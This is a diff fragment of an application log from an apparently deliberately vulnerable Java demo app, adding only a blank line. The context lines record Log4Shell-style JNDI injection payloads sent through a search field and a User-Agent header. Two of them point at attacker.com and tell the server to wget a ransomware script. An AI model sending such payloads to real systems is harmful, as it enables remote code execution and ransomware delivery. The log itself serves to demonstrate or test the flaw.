@@ -28,3 +28,4 @@
 2025-10-30 22:39:50.381 [http-nio-8080-exec-8] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://evil.com:1389/Exploit}
 2025-10-30 22:39:40.336 [http-nio-8080-exec-3] INFO  com.miempresa.VulnerableApp - User-Agent recibido: ${jndi:ldap://attacker.com:1389/cmd/wget+http://attacker.com/ransomware.py}
 2025-10-30 22:39:43.346 [http-nio-8080-exec-2] WARN  com.miempresa.VulnerableApp - Busqueda ejecutada: ${jndi:ldap://attacker.com:1389/cmd/wget http://attacker.com/ransomware.py}
+
